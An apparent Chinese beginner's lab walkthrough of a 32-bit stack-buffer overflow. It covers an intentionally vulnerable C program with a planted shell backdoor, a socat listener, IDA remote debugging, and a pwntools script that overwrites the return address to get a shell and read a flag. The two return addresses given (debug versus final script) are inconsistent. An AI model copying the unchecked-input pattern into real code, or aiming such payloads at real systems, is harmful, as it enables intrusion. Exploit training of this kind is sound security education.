PWN入门有那么难吗，此文篇幅很小，如果你想做，一定可以学会。加油，打工人！

## 准备

 **虚拟机：** CentOS 6.8 32bit、gcc、socat  
 **宿主机：** IDA7.0、 Python + pwntools

> 略有小坑，当宿主机IDA连接不到centOS时，请关闭centOS的防火墙：service iptables stop

大家都说栈溢出是PWN的`Hello
World`，那么我将用一个简单的例子，手把手的来演示一个非常简单的栈溢出利用，顺便学习用下我们的pwntools，万事开头难，但如果你跟着流程走一遍的话，会开启一个新世界的大门。

## 存在栈溢出的代码分析

稍微懂点C和汇编，这个例子人人都能上手，简单说，有手就行。贴出我们本次实验要使用的C代码，解释的方式我都用注释来进行：

    
    
    //stack_overflow.c
    #include <stdio.h>
    
    // 这是存在栈溢出的函数
    void stack_overflow()
    {
            char buf[64] = {0};
            scanf("%s", &buf); //将输入的数据读入buf中
            printf("Hello %s\n", &buf); //打印出buf中的内容
    }
    
    // 为了方便实验这里留下一个后门函数
    void get_shell()
    {
            system("/bin/sh");
    }
    
    // 程序入口
    void main()
    {
            stack_overflow();
    }

分析一下，上边代码存在栈溢出的部分在`scanf()`函数，因为buf是在栈空间中的，buf是分配了64个字节但是却没有限制输入的长度。

## 如何栈溢出

既然是栈溢出，那么我相信大家都有一定的基础吧，起码了解下什么是栈。首先最重要的是，我们要知道为什么会有栈的存在，这要从函数的发明说起，感兴趣的可以查阅一下wiki。栈的用途之一就是为了存储局部变量，那么上层函数的返回地址也存储在栈中。

### 第一次调试

代码写好了，我们先来编译运行一下

    
    
    [root@localhost pwn]# gcc stack_overflow.c -o stack_overflow
    [root@localhost pwn]# ./stack_overflow 
    stack_overflow
    Hello stack_overflow

好，结果简简单单，输入一个字符串，然后输出。那么我们打开宿主机的IDA，把我们编译好的程序拖进IDA，然后在stack_overflow的地方下好断点

![](https://image.3001.net/images/20201027/1603805352_5f9820a86d2267513cc9e.jpg!small)接下来将IDA安装目录的linux_server拷贝到centOS上，运行起来

    
    
    [root@localhost pwn]# ./linux_server 
    IDA Linux 32-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017
    Listening on 0.0.0.0:23946...

到IDA中，选择 "Debugger" --> "Select debugger"；然后选”Remote Linux
debugger“，点击“OK”；点击“Debugger” --> "Process
options..."；Hostname填入centOS的IP，Port默认是23946；其他的默认，然后我们按“F9”开始调试

![](https://image.3001.net/images/20201027/1603805406_5f9820dede1c81131de94.jpg!small)我们继续往下走，直到输入`AAAAAA`之后

![](https://image.3001.net/images/20201027/1603805432_5f9820f8acd77e758880c.jpg!small)那么到这里，思路来了，因为上边那个程序没有对输入的长度做校验，对于上边那个程序我们要做的就是计算好输入的长度，然后将后门地址填充到返回的地址，计算一下输入的地址距离buf地址的长度`0xBF8C17BC-0xBF8C1770`等于`0x4C`所以接下来思路就很明确了，我们填充0x4C个字符后，再填入后门的地址。

### 第二次调试

紧接着第一次调试，这次调试我们使用pwntools接管程序的输入输出。首先，我们在centOS上使用socat将输入输出转发到9999端口：

    
    
    [root@localhost pwn]# socat tcp-listen:9999,reuseaddr,fork EXEC:./stack_overflow,pty,raw,echo=0

[root@localhost pwn]# socat tcp-listen:9999,reuseaddr,fork
EXEC:./stack_overflow,pty,raw,echo=0

然后我们用pwntools连接下：

    
    
    ➜  ~ python3
    Python 3.7.4 (default, Sep  7 2019, 17:46:28)
    [Clang 10.0.1 (clang-1001.0.46.4)] on darwin
    Type "help", "copyright", "credits" or "license" for more information.
    >>> from pwn import *
    >>> io = remote('172.16.177.134', 9999)
    [x] Opening connection to 172.16.177.134 on port 9999
    [x] Opening connection to 172.16.177.134 on port 9999: Trying 172.16.177.134
    [+] Opening connection to 172.16.177.134 on port 9999: Done

此时已经连接成功，stack_overflow程序也已经跑起来了；返回IDA，我们在scanf的下一句汇编下好断点；然后选择"Debugger" -->
"Attach to process..."，选择运行起来的stack_overflow；点击"OK"；然后再按下"F9"，让程序跑起来

![](https://image.3001.net/images/20201027/1603805511_5f9821476fca7b64764d2.jpg!small)在Python中，我们继续，发送我们输入的数据，记得要发送一个回车，也可以用sendline()函数，自带回车：

    
    
    >>> payload = b'A'*0x4c + p32(0x0804848e)
    >>> io.send(payload)
    >>> io.send('\n')

接下来IDA断下了，我们继续往下步过，到retn，我们发现即将跳转到get_shell()这里。

![](https://image.3001.net/images/20201027/1603805547_5f98216bc2188b17295ba.jpg!small)接下来我就不一一调试了，感兴趣的同学可以继续往下跟，这里我直接`F9`，然后使用pwntools进入命令行的交互模式，为了让大家有点感觉`:)`，我这里加了一个flag.txt：

    
    
    >>> io.interactive()
    [*] Switching to interactive mode
    Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
    ls
    flag.txt  linux_server	stack_overflow	stack_overflow.c
    cat flag.txt
    flag{Y0u_Win_by_ATL_TEAM}

每次调试完完记得io.close()，不然会出现很多stack_overflow的程序。

## EXP编写

综合上述，那么EXP应该这样写

    
    
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-    
    from pwn import *
    io = remote('172.16.177.134', 9999)
    payload = b'A'*0x4C + p32(0x08048475)
    io.sendline(payload)
    io.interactive()
    io.close()

## 小结

吐槽下编辑器，第一遍竟然没保存成功，还好文章不长。如果步骤没说清楚，请大家评论，毕竟第一次写文章哈哈，如果上边还不过瘾的话，别担心，此文章还会有后续的～

